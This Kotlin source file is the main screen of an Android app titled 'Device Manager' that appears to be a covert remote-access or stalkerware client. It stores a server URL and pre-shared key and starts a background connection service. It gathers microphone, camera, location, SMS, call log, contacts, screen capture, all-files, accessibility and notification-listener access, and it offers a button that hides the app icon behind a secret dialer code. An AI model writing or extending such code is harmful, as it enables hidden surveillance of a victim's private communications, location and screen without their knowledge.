package com.example.admin

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.text.InputType
import android.view.Gravity
import android.widget.*
import androidx.core.content.ContextCompat

class MainActivity : Activity() {

    private lateinit var statusText: TextView
    private lateinit var btnToggle: Button
    private lateinit var btnGrantScreen: Button
    private lateinit var btnAllFiles: Button
    private lateinit var btnAccessibility: Button
    private lateinit var btnNotifs: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val scroll = ScrollView(this)
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(48, 80, 48, 80)
            setBackgroundColor(Color.parseColor("#121212")) // Deep Charcoal
        }
        scroll.addView(root)
        setContentView(scroll)

        // Title
        root.addView(TextView(this).apply {
            text = "Device Manager"
            textSize = 26f
            setTextColor(Color.WHITE)
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 40)
        })

        // --- CONFIG CARD ---
        val configCard = createCard()
        configCard.addView(TextView(this).apply { text = "Configuration"; setTextColor(Color.parseColor("#00E676")); textSize = 14f; setTypeface(null, Typeface.BOLD); setPadding(0,0,0,20) })
        
        val serverEt = EditText(this).apply {
            hint = "Server URL"
            setText(Prefs.getServer(this@MainActivity))
            setTextColor(Color.WHITE)
            setHintTextColor(Color.GRAY)
            setBackgroundColor(Color.parseColor("#1E1E1E"))
            setPadding(30, 30, 30, 30)
        }
        configCard.addView(serverEt)

        val pskEt = EditText(this).apply {
            hint = "Auth Key (PSK)"
            setText(Prefs.getPsk(this@MainActivity))
            setTextColor(Color.WHITE)
            setHintTextColor(Color.GRAY)
            setBackgroundColor(Color.parseColor("#1E1E1E"))
            setPadding(30, 30, 30, 30)
            inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
            setPadding(30, 30, 30, 30)
        }
        configCard.addView(pskEt)

        configCard.addView(createBtn("Save Settings", "#323232", Color.WHITE) {
            Prefs.setServer(this@MainActivity, serverEt.text.toString().trim())
            Prefs.setPsk(this@MainActivity, pskEt.text.toString().trim())
            Toast.makeText(this@MainActivity, "Saved.", Toast.LENGTH_SHORT).show()
        })
        root.addView(configCard)

        // --- STATUS & SERVICE CARD ---
        val statusCard = createCard()
        statusCard.addView(TextView(this).apply { text = "Connection Status"; setTextColor(Color.parseColor("#00E676")); textSize = 14f; setTypeface(null, Typeface.BOLD); setPadding(0,0,0,10) })
        
        statusText = TextView(this).apply {
            setTextColor(Color.LTGRAY)
            textSize = 13f
            setPadding(0, 0, 0, 30)
            lineSpacing = 1.5f
        }
        statusCard.addView(statusText)

        btnToggle = createBtn("Start Service", "#00E676", Color.BLACK) { toggleService() }
        statusCard.addView(btnToggle)
        root.addView(statusCard)

        // --- PERMISSIONS CARD ---
        val permCard = createCard()
        permCard.addView(TextView(this).apply { text = "Permissions & Access"; setTextColor(Color.parseColor("#00E676")); textSize = 14f; setTypeface(null, Typeface.BOLD); setPadding(0,0,0,20) })

        permCard.addView(createBtn("Request Runtime Permissions", "#1E1E1E", Color.WHITE) { requestPerms() })
        
        btnGrantScreen = createBtn("Grant Screen Capture", "#1E1E1E", Color.WHITE) { requestScreenCapture() }
        permCard.addView(btnGrantScreen)

        btnAllFiles = createBtn("Allow All Files Access", "#1E1E1E", Color.WHITE) { requestAllFiles() }
        permCard.addView(btnAllFiles)

        btnAccessibility = createBtn("Enable Accessibility Service", "#1E1E1E", Color.WHITE) { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }
        permCard.addView(btnAccessibility)

        btnNotifs = createBtn("Enable Notification Listener", "#1E1E1E", Color.WHITE) { startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")) }
        permCard.addView(btnNotifs)
        
        root.addView(permCard)

        // --- DANGER CARD ---
        val dangerCard = createCard()
        dangerCard.addView(createBtn("Hide App Icon", "#B71C1C", Color.WHITE) {
            StealthManager.hide(this@MainActivity)
            Toast.makeText(this@MainActivity, "Icon hidden. Dial *#*#1337#*#* to unhide.", Toast.LENGTH_LONG).show()
        })
        root.addView(dangerCard)
    }

    override fun onResume() {
        super.onResume()
        updateStatus()
    }

    private fun toggleService() {
        if (Prefs.isRunning(this)) {
            val intent = Intent(this, ConnectionService::class.java).apply { action = ConnectionService.ACTION_STOP }
            startService(intent)
        } else {
            if (Prefs.getServer(this).isBlank() || Prefs.getPsk(this).isBlank()) {
                Toast.makeText(this, "Save settings first.", Toast.LENGTH_SHORT).show()
                return
            }
            ContextCompat.startForegroundService(this, Intent(this, ConnectionService::class.java))
        }
        updateStatus()
    }

    private fun updateStatus() {
        val isRunning = Prefs.isRunning(this)
        
        // Update Toggle Button
        if (isRunning) {
            btnToggle.text = "STOP SERVICE"
            btnToggle.background = getRoundRect("#FF5252") // Muted Coral
            btnToggle.setTextColor(Color.WHITE)
        } else {
            btnToggle.text = "START SERVICE"
            btnToggle.background = getRoundRect("#00E676") // Mint Green
            btnToggle.setTextColor(Color.BLACK)
        }

        val sb = StringBuilder()
        sb.append(if (checkPerm(Manifest.permission.RECORD_AUDIO)) "✅ Microphone\n" else "❌ Microphone\n")
        sb.append(if (checkPerm(Manifest.permission.CAMERA)) "✅ Camera\n" else "❌ Camera\n")
        sb.append(if (checkPerm(Manifest.permission.READ_SMS)) "✅ SMS & Calls\n" else "❌ SMS & Calls\n")
        
        val accEnabled = TouchService.instance != null
        sb.append(if (accEnabled) "✅ Accessibility\n" else "❌ Accessibility\n")
        
        val notifEnabled = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")?.contains(packageName) == true
        sb.append(if (notifEnabled) "✅ Notifications\n" else "❌ Notifications\n")
        
        if (Build.VERSION.SDK_INT >= 30) {
            sb.append(if (Environment.isExternalStorageManager()) "✅ All Files Access" else "❌ All Files Access")
        }
        statusText.text = sb.toString()
    }

    private fun checkPerm(p: String) = ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED

    // --- UI HELPERS ---
    private fun createCard(): LinearLayout {
        return LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#1E1E1E"))
            setPadding(40, 40, 40, 40)
            val params = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
            params.setMargins(0, 0, 0, 40)
            layoutParams = params
            val bg = GradientDrawable()
            bg.setColor(Color.parseColor("#1E1E1E"))
            bg.cornerRadius = 40f
            background = bg
        }
    }

    private fun getRoundRect(colorHex: String): GradientDrawable {
        val bg = GradientDrawable()
        bg.setColor(Color.parseColor(colorHex))
        bg.cornerRadius = 30f
        return bg
    }

    private fun createBtn(label: String, bgColor: String, textColor: Int, onClick: () -> Unit): Button {
        return Button(this).apply {
            text = label
            setTextColor(textColor)
            background = getRoundRect(bgColor)
            setPadding(0, 35, 0, 35)
            setTypeface(null, Typeface.BOLD)
            setOnClickListener { onClick() }
            val params = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
            params.setMargins(0, 15, 0, 0)
            layoutParams = params
        }
    }

    private fun requestPerms() {
        val perms = mutableListOf(
            Manifest.permission.RECORD_AUDIO, Manifest.permission.CAMERA,
            Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_CONTACTS,
            Manifest.permission.POST_NOTIFICATIONS
        )
        if (Build.VERSION.SDK_INT >= 33) perms.add(Manifest.permission.READ_MEDIA_IMAGES)
        else perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)

        val missing = perms.filter { !checkPerm(it) }
        if (missing.isNotEmpty()) requestPermissions(missing.toTypedArray(), 100)
        else Toast.makeText(this, "All requested permissions granted.", Toast.LENGTH_SHORT).show()
    }

    private fun requestScreenCapture() {
        val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mpm.createScreenCaptureIntent(), 200)
    }

    private fun requestAllFiles() {
        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                intent.addCategory("android.intent.category.DEFAULT")
                intent.data = Uri.parse(String.format("package:%s", applicationContext.packageName))
                startActivity(intent)
            } catch (e: Exception) {
                startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
            }
        } else {
            Toast.makeText(this, "All files access granted or not needed.", Toast.LENGTH_SHORT).show()
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 200 && resultCode == RESULT_OK && data != null) {
            ConnectionService.screenResultCode = resultCode
            ConnectionService.screenData = data
            Toast.makeText(this, "Screen capture granted.", Toast.LENGTH_SHORT).show()
        }
    }
}
